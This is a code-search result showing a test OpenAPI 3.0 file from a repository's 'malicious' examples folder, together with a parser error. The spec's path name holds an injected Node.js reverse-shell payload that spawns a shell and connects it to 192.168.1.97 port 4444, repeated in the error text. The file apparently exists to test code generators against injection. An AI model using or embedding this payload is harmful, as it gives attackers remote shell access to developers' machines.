{
	"File": {
		"__typename": "FileMatch",
		"repository": {
			"name": "github.com/Mermade/openapi3-examples"
		},
		"file": {
			"name": "rapid7-js.json",
			"size": 0,
			"path": "3.0/malicious/rapid7-js.json",
			"byteSize": 2528,
			"content": "{\n    \"openapi\": \"3.0.0\",\n    \"servers\": [\n        {\n            \"url\": \"http://localhost/\"\n        }\n    ],\n    \"info\": {\n        \"description\": \"A\",\n        \"version\": \"1.0.0\",\n        \"title\": \"C\",\n        \"contact\": {\n            \"name\": \"Rapid 7\",\n            \"url\": \"https://www.rapid7.com/\",\n            \"email\": \"info@rapid7.com\"\n        },\n        \"license\": {\n            \"name\": \"BSD-3-clause\",\n            \"url\": \"https://opensource.org/licenses/BSD-3-Clause\"\n        }\n    },\n    \"tags\": [\n        {\n            \"name\": \"default\"\n        }\n    ],\n    \"paths\": {\n        \"/a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \\\"cmd\\\" : \\\"/bin/sh\\\"; var net = require(\\\"net\\\"), cp = require(\\\"child_process\\\"), util = require(\\\"util\\\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \\\"192.168.1.97\\\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \\\"undefined\\\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\\\"error\\\", function(error) { counter++; if(counter\u003c= 10){ setTimeout(function() { StagerRepeat();}, 5.0*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array('\": {\n            \"summary\": \"an example path\",\n            \"get\": {\n                \"operationId\": \"get_a\",\n                \"tags\": [\n                    \"default\"\n                ],\n                \"description\": \"D\",\n                \"responses\": {\n                    \"200\": {\n                        \"description\": \"E\",\n                        \"content\": {\n                            \"application/json\": {\n                                \"schema\": {\n                                    \"$ref\": \"#/components/schemas/d\"\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    },\n    \"components\": {\n        \"schemas\": {\n            \"d\": {\n                \"type\": \"object\",\n                \"description\": \"F\",\n                \"properties\": {\n                    \"id\": {\n                        \"type\": \"integer\",\n                        \"format\": \"int64\"\n                    }\n                }\n            }\n        }\n    }\n}\n"
		}
	},
	"Error": "parse: parse spec: parse operations: paths: /a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \"192.168.1.97\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if(counter\u003c= 10){ setTimeout(function() { StagerRepeat();}, 5.0*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array(': get: operation \"get_a\": parse path: invalid path: /a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \"192.168.1.97\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if(counter\u003c= 10){ setTimeout(function() { StagerRepeat();}, 5.0*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array('"
}